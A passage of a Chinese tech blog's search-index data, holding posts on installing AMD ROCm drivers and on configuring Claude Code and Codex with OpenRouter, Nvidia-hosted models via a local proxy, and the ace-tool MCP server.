debian用户\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install -y wget gnupg2 curl software-properties-common linux-headers-\u003cspan class=\"k\"\u003e$(\u003c/span\u003euname -r\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget -qO - https://repo.radeon.com/rocm/rocm.gpg.key \u003cspan class=\"p\"\u003e|\u003c/span\u003e sudo gpg --dearmor -o /etc/apt/keyrings/rocm.gpg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/rocm.gpg] https://repo.radeon.com/amdgpu/6.2/ubuntu jammy main\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sudo tee /etc/apt/sources.list.d/amdgpu.list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/rocm.gpg] https://repo.radeon.com/rocm/apt/6.2 jammy main\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e sudo tee /etc/apt/sources.list.d/rocm.list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo tee /etc/apt/preferences.d/rocm-pin-600 \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ePackage: *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ePin: origin repo.radeon.com\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ePin-Priority: 600\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install -y amdgpu-dkms rocm-hip-libraries rocm-hip-sdk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo usermod -aG video,render \u003cspan class=\"nv\"\u003e$USER\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo reboot\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后就安装好了显卡驱动，解释一下，必须让新repo的优先级提高，才能安装！确认一下：\u003c/p\u003e","title":"Claude Code如何使用ollama提供的qwen3:2.5B大模型来私网使用"},{"content":"Cluade code、Codex、Gemini三架马车是齐头并进的势头，那将来必定是Farm农场和Token战争的年代。\n那节省成本的方法是尽量使用合适的模型来做合适的事情\n那如果有openrouter的API KEY，如何接入Claude code进行使用呢？\nopenrouter基本提供了500个AI models，从中选择合适的模型就可以极大的降低费用\n那Claude Code使用的三个模型\nOpus \u0026ndash; 复杂推理任务（适合架构设计、解决棘手 Bug） Sonnet \u0026ndash; 日常标准任务（适合绝大多数编程/写代码工作） Haiku \u0026ndash; 快速、低成本任务（适合探索性工作、查阅文档） 我们分别用 Gemini Flash、DeepSeek Coder来替代，最后用Sonnet来补全剩余部分，就省钱多了\n方法如下：\n一、gen出OpenRoute的API Key 访问 OpenRouter 注册登录 (有 $1 的免费额度) 访问 API Keys 点击 “Create Key” 把key复制下来 (类似 sk-or-v1-...) 二、安装配置薅Claude Code 这个也不多说了\n三、配置连接Claude Code的连接 主要是几个变量：\nexport OPENROUTER_API_KEY=\u0026#34;sk-or-v1-your-actual-key-here\u0026#34; export ANTHROPIC_BASE_URL=\u0026#34;https://openrouter.ai/api\u0026#34; export ANTHROPIC_AUTH_TOKEN=\u0026#34;$OPENROUTER_API_KEY\u0026#34; export ANTHROPIC_API_KEY=\u0026#34;\u0026#34; 验证一下，启动claude，输入 /status\n看到就ok了\n四、Cluaude工具链调用的模型选择 Claude Code需要模型能支持\u0026quot;tool use\u0026quot;(也叫做函数调用)，这些允许Claude code做如下事情\n*Read and edit files* *Run terminal commands* *Search your codebase* *Execute git commands* 支持工具链调用的模型:\nAll Claude models (Opus, Sonnet, Haiku) GPT-4, GPT-4 Turbo, GPT-4o, GPT-5 series Google Gemini 1.5 Pro, Gemini 2.0 Pro, Gemini 3.0 Pro DeepSeek Coder V2 不支持工具链调用的模型:\n大多数 Llama 模型 7B的基座模型 大多数的小型开源模型 五、选择合适的模型 那基于上面的原则，以及Claude code的三个模型，我们可以选择合适的替代模型\nexport ANTHROPIC_DEFAULT_SONNET_MODEL=\u0026#34;openai/gpt-4o\u0026#34; export ANTHROPIC_DEFAULT_OPUS_MODEL=\u0026#34;openai/gpt-5.2-pro\u0026#34; export ANTHROPIC_DEFAULT_HAIKU_MODEL=\u0026#34;google/gemini-2.0-flash\u0026#34; 推荐的模型栈（节省大量费用）： export ANTHROPIC_DEFAULT_HAIKU_MODEL=\u0026#34;google/gemini-2.0-flash\u0026#34; export ANTHROPIC_DEFAULT_SONNET_MODEL=\u0026#34;deepseek/deepseek-coder-v2\u0026#34; export ANTHROPIC_DEFAULT_OPUS_MODEL=\u0026#34;anthropic/claude-sonnet-4.5\u0026#34; 六、(可选)优化openrouter的模型链 那由于openrouter有个preset的模型链链路，可以指定模型失败后的备用模型，我们可以更好的优化\nexport ANTHROPIC_DEFAULT_SONNET_MODEL=\u0026#34;@preset/beast-mode-workflow\u0026#34; preset的定义： { \u0026#34;name\u0026#34;: \u0026#34;beast-mode-workflow\u0026#34;, \u0026#34;model\u0026#34;: \u0026#34;anthropic/claude-sonnet-4.5\u0026#34;, \u0026#34;fallbacks\u0026#34;: [ \u0026#34;openai/gpt-4o\u0026#34;, \u0026#34;google/gemini-2.5-pro\u0026#34;, \u0026#34;deepseek/deepseek-coder-v2\u0026#34; ], \u0026#34;route\u0026#34;: \u0026#34;fallback\u0026#34; } 如果claude-sonnet-4.5失败，那会依次调用备用模型：openai/gpt-4o \u0026ndash;\u0026gt; google/gemini-2.5-pro \u0026ndash;\u0026gt; deepseek/deepseek-coder-v2\n七、根据不同状况，灵活选用模型 1、初期探索\nexport ANTHROPIC_DEFAULT_SONNET_MODEL=\u0026#34;google/gemini-2.0-flash\u0026#34; claude 2、节省费用的实施阶段\nexport ANTHROPIC_DEFAULT_SONNET_MODEL=\u0026#34;deepseek/deepseek-coder-v2\u0026#34; claude 3、高级模式\nexport ANTHROPIC_DEFAULT_SONNET_MODEL=\u0026#34;anthropic/claude-sonnet-4.5\u0026#34; claude 4、A/B 测试\n# A轮测试 export ANTHROPIC_DEFAULT_SONNET_MODEL=\u0026#34;deepseek/deepseek-coder-v2\u0026#34; claude -p \u0026#34;Implement a simple cache with LRU eviction\u0026#34; \u0026gt; output-deepseek.txt # B轮测试 export ANTHROPIC_DEFAULT_SONNET_MODEL=\u0026#34;anthropic/claude-sonnet-4.5\u0026#34; claude -p \u0026#34;Implement a simple cache with LRU eviction\u0026#34; \u0026gt; output-sonnet.txt # C轮测试 export ANTHROPIC_DEFAULT_SONNET_MODEL=\u0026#34;google/gemini-2.5-pro\u0026#34; claude -p \u0026#34;Implement a simple cache with LRU eviction\u0026#34; \u0026gt; output-gemini.txt # 比较A/B轮测试结果 diff output-deepseek.txt output-sonnet.txt ","permalink":"https://rendoumi.com/posts/20260203-claudecode_openrouter/","summary":"\u003cp\u003eCluade code、Codex、Gemini三架马车是齐头并进的势头，那将来必定是Farm农场和Token战争的年代。\u003c/p\u003e\n\u003cp\u003e那节省成本的方法是尽量使用合适的模型来做合适的事情\u003c/p\u003e\n\u003cp\u003e那如果有openrouter的API KEY，如何接入Claude code进行使用呢？\u003c/p\u003e\n\u003cp\u003eopenrouter基本提供了500个AI models，从中选择合适的模型就可以极大的降低费用\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260203092128937\" loading=\"lazy\" src=\"/posts/20260203-claudecode_openrouter/image-20260203092128937.png\"\u003e\u003c/p\u003e\n\u003cp\u003e那Claude Code使用的三个模型\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eOpus \u0026ndash; \u003cstrong\u003e复杂推理任务\u003c/strong\u003e（适合架构设计、解决棘手 Bug）\u003c/li\u003e\n\u003cli\u003eSonnet \u0026ndash; \u003cstrong\u003e日常标准任务\u003c/strong\u003e（适合绝大多数编程/写代码工作）\u003c/li\u003e\n\u003cli\u003eHaiku \u0026ndash; \u003cstrong\u003e快速、低成本任务\u003c/strong\u003e（适合探索性工作、查阅文档）\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我们分别用 Gemini Flash、DeepSeek Coder来替代，最后用Sonnet来补全剩余部分，就省钱多了\u003c/p\u003e\n\u003cp\u003e方法如下：\u003c/p\u003e\n\u003ch4 id=\"一gen出openroute的api-key\"\u003e一、gen出OpenRoute的API Key\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e访问 \u003ca href=\"https://openrouter.ai/\"\u003eOpenRouter\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e注册登录 (有 $1 的免费额度)\u003c/li\u003e\n\u003cli\u003e访问 \u003ca href=\"https://openrouter.ai/keys\"\u003eAPI Keys\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e点击 “Create Key”\u003c/li\u003e\n\u003cli\u003e把key复制下来 (类似 \u003ccode\u003esk-or-v1-...\u003c/code\u003e)\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"二安装配置薅claude-code\"\u003e二、安装配置薅Claude Code\u003c/h4\u003e\n\u003cp\u003e这个也不多说了\u003c/p\u003e\n\u003ch4 id=\"三配置连接claude-code的连接\"\u003e三、配置连接Claude Code的连接\u003c/h4\u003e\n\u003cp\u003e主要是几个变量：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eOPENROUTER_API_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;sk-or-v1-your-actual-key-here\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_BASE_URL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://openrouter.ai/api\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_AUTH_TOKEN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$OPENROUTER_API_KEY\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_API_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e验证一下，启动claude，输入 /status\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260203093938347\" loading=\"lazy\" src=\"/posts/20260203-claudecode_openrouter/image-20260203093938347.png\"\u003e\u003c/p\u003e\n\u003cp\u003e看到就ok了\u003c/p\u003e\n\u003ch4 id=\"四cluaude工具链调用的模型选择\"\u003e四、Cluaude工具链调用的模型选择\u003c/h4\u003e\n\u003cp\u003eClaude Code需要模型能支持\u0026quot;tool use\u0026quot;(也叫做函数调用)，这些允许Claude code做如下事情\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e*\u003cstrong\u003eRead and edit files*\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e*\u003cstrong\u003eRun terminal commands*\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e*\u003cstrong\u003eSearch your codebase*\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003e*\u003cstrong\u003eExecute git commands*\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e支持工具链调用的模型:\u003c/strong\u003e\u003c/p\u003e","title":"Claude Code如何使用openrouter提供的大模型来节省费用"},{"content":"黄大善人的Nvidia里面有很多免费的模型，包括zai/glm4.7和minimaxai/minimax-m2.1\n那没有订阅的同学们可以拿来直接用到Cluade code中\n方法如下：\n一、从官网进行获取api-key 起手先注册账户拿Key\n地址：https://build.nvidia.com/explore/discover\n或者\n二、如何使用 然后主要是我不用ccr，CLIProxyAPI也开全局代理了，也无法用，所以干脆搓个好了 用ccr和CLIProxyAPI就可以直接用。\n源代码：\nhttps://github.com/zhangrr/claude-nvidia-proxy 配置文件：\n{ \u0026#34;nvidia_url\u0026#34;: \u0026#34;https://integrate.api.nvidia.com/v1/chat/completions\u0026#34;, \u0026#34;nvidia_key\u0026#34;: \u0026#34;nvapi-api-key\u0026#34; } 直接运行程序，会监听本地端口3001\nglm 4.7的配法：\nexport ANTHROPIC_BASE_URL=http://localhost:3001 export ANTHROPIC_AUTH_TOKEN=nvapi-api-key export ANTHROPIC_DEFAULT_HAIKU_MODEL=z-ai/glm4.7 export ANTHROPIC_DEFAULT_SONNET_MODEL=z-ai/glm4.7 export ANTHROPIC_DEFAULT_OPUS_MODEL=z-ai/glm4.7 claude minimax 2.1 的配法：\nexport ANTHROPIC_BASE_URL=http://localhost:3001 export ANTHROPIC_AUTH_TOKEN=nvapi-api-key export ANTHROPIC_DEFAULT_HAIKU_MODEL=minimaxai/minimax-m2.1 export ANTHROPIC_DEFAULT_SONNET_MODEL=minimaxai/minimax-m2.1 export ANTHROPIC_DEFAULT_OPUS_MODEL=minimaxai/minimax-m2.1 claude ","permalink":"https://rendoumi.com/posts/20260120-nvidia_claudecode/","summary":"\u003cp\u003e黄大善人的Nvidia里面有很多免费的模型，包括zai/glm4.7和minimaxai/minimax-m2.1\u003c/p\u003e\n\u003cp\u003e那没有订阅的同学们可以拿来直接用到Cluade code中\u003c/p\u003e\n\u003cp\u003e方法如下：\u003c/p\u003e\n\u003ch3 id=\"一从官网进行获取api-key\"\u003e一、从官网进行获取api-key\u003c/h3\u003e\n\u003cp\u003e起手先注册账户拿Key\u003c/p\u003e\n\u003cp\u003e地址：https://build.nvidia.com/explore/discover\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260120112209005\" loading=\"lazy\" src=\"/posts/20260120-nvidia_claudecode/image-20260120112209005.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260120112343106\" loading=\"lazy\" src=\"/posts/20260120-nvidia_claudecode/image-20260120112343106.png\"\u003e\u003c/p\u003e\n\u003cp\u003e或者\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260120112301489\" loading=\"lazy\" src=\"/posts/20260120-nvidia_claudecode/image-20260120112301489.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"二如何使用\"\u003e二、如何使用\u003c/h3\u003e\n\u003cp\u003e然后主要是我不用ccr，CLIProxyAPI也开全局代理了，也无法用，所以干脆搓个好了\n用ccr和CLIProxyAPI就可以直接用。\u003c/p\u003e\n\u003cp\u003e源代码：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttps://github.com/zhangrr/claude-nvidia-proxy\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e配置文件：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;nvidia_url\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;https://integrate.api.nvidia.com/v1/chat/completions\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;nvidia_key\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;nvapi-api-key\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e直接运行程序，会监听本地端口3001\u003c/p\u003e\n\u003cp\u003eglm 4.7的配法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_BASE_URL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://localhost:3001\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_AUTH_TOKEN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003envapi-api-key\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_DEFAULT_HAIKU_MODEL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ez-ai/glm4.7\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_DEFAULT_SONNET_MODEL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ez-ai/glm4.7\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_DEFAULT_OPUS_MODEL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ez-ai/glm4.7\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eclaude\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eminimax 2.1 的配法：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_BASE_URL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://localhost:3001\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_AUTH_TOKEN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003envapi-api-key\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_DEFAULT_HAIKU_MODEL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eminimaxai/minimax-m2.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_DEFAULT_SONNET_MODEL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eminimaxai/minimax-m2.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eANTHROPIC_DEFAULT_OPUS_MODEL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eminimaxai/minimax-m2.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eclaude\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20260120112903833\" loading=\"lazy\" src=\"/posts/20260120-nvidia_claudecode/image-20260120112903833.png\"\u003e\u003c/p\u003e","title":"黄大善人免费的的nvidia glm和minimax模型应用于Claude Code"},{"content":"那缺省的claude code 和 codex 都很好用，上下文搜索用rigrep也算可以，那有更厉害的Augment引擎，能压缩上下文\n试一试，首先去佬友的网站：\nhttps://acemcp.heroman.wtf 注册并申请好API Key\n然后安装这个ace-tool-rs或者ace-tool\n# 安装最新版本 npx ace-tool-rs npx ace-tool 然后最重要要的，在什么地方添加文档，编辑~/.claude.json文件。\n不是系统的~/.claude/settings.json，千万别弄错了\n添加：\n\u0026#34;mcpServers\u0026#34;: { \u0026#34;ace-tool-rs\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;stdio\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;npx\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;ace-tool-rs\u0026#34;, \u0026#34;--base-url\u0026#34;, \u0026#34;https://acemcp.heroman.wtf/relay/\u0026#34;, \u0026#34;--token\u0026#34;, \u0026#34;ace_api_key\u0026#34; ], \u0026#34;env\u0026#34;: {} } } { \u0026#34;mcpServers\u0026#34;: { \u0026#34;ace-tool\u0026#34;: { \u0026#34;command\u0026#34;: \u0026#34;/root/.nvm/versions/node/v22.21.1/bin/ace-tool\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;--base-url\u0026#34;, \u0026#34;https://acemcp.heroman.wtf/relay/\u0026#34;, \u0026#34;--token\u0026#34;, \u0026#34;ace_api_key\u0026#34; ] } } 我的ace-tool比较直接，command是全路径的，因为node是nvm管理的，而且claude运行的时候是派生一个子进程来运行的，导致路径找不到；或者更加直接的，bash起手，ace-tool放进 args里。\n那codex如下：\n[mcp_servers.ace-tool] command = \u0026#34;ace-tool\u0026#34; args = [ \u0026#34;--enable-log\u0026#34;, \u0026#34;--base-url\u0026#34;, \u0026#34;https://acemcp.heroman.wtf/relay/\u0026#34;, \u0026#34;--token\u0026#34;, \u0026#34;ace_api_key\u0026#34;] [mcp_servers.ace-tool-rs] command = \u0026#34;npx\u0026#34; args = [\u0026#34;ace-tool-rs\u0026#34;, \u0026#34;--base-url\u0026#34;, \u0026#34;https://acemcp.heroman.wtf/relay/\u0026#34;, \u0026#34;--token\u0026#34;, \u0026#34;ace_api_key\u0026#34;, \u0026#34;--transport\u0026#34;, \u0026#34;lsp\u0026#34;] env = { RUST_LOG = \u0026#34;info\u0026#34; } startup_timeout_ms = 60000 然后验证\n/mcp list 使用ace-tool-rs mcp来索引整个项目 ","permalink":"https://rendoumi.com/posts/20260115-clauce_ace_tool/","summary":"\u003cp\u003e那缺省的claude code 和 codex 都很好用，上下文搜索用rigrep也算可以，那有更厉害的Augment引擎，能压缩上下文\u003c/p\u003e\n\u003cp\u003e试一试，首先去佬友的网站：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps://acemcp.heroman.wtf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注册并申请好API Key\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20260115095940639\" loading=\"lazy\" src=\"/posts/20260115-clauce_ace_tool/image-20260115095940639.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后安装这个ace-tool-rs或者ace-tool\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 安装最新版本\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpx ace-tool-rs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enpx ace-tool\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后最重要要的，在什么地方添加文档，编辑~/.claude.json文件。\u003c/p\u003e\n\u003cp\u003e不是系统的~/.claude/settings.json，千万别弄错了\u003c/p\u003e\n\u003cp\u003e添加：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;mcpServers\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ace-tool-rs\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;type\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;stdio\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;command\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;npx\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"s2\"\u003e\u0026#34;args\u0026#34;\u003c/span\u003e: \u003cspan 